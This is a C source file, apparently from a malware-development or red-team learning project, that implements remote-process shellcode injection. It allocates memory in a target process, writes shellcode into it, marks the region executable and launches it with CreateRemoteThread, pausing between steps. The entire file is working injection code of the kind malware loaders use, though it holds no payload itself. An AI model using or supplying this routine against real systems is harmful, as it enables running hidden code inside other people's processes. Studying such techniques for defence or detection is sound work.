#include "glassBox.h"

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	PVOID pShellcodeAddress = NULL;
	SIZE_T sNumberOfBytesWritten = 0;
	DWORD dwOldProtection = NULL;

	// Allocate memory in the remote process of size sSizeOfShellcode
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		warn("VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	info("Allocated Memory At : 0x%p \n", pShellcodeAddress);
	in("Press <Enter> To Write Payload ...");
	getchar();

	// Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		warn("WritePrcoessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	info("Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	memset(pShellcode, '\0', sSizeOfShellcode);

	// Make memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		warn("VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	in("Press <Enter> To Run ... ");
	getchar();
	info("Executing Payload ... ");
	
	// Launch the shellcode in a new thread
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
	if (!hThread) {
		warn("CreateRemoteThread Failed With Error : %d \n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);

	//if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
	//	warn("CreateRemoteThread Failed With Error : %d \n", GetLastError());
	//	return FALSE;
	//}

	in("Press <Enter> To Clear Injected Memory ...");
	getchar();

	if (!VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE)) {
		warn("VirtualFreeEx Failed With Error : %d \n", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	CloseHandle(hProcess);

	okay("DONE !\n");

	return TRUE;
}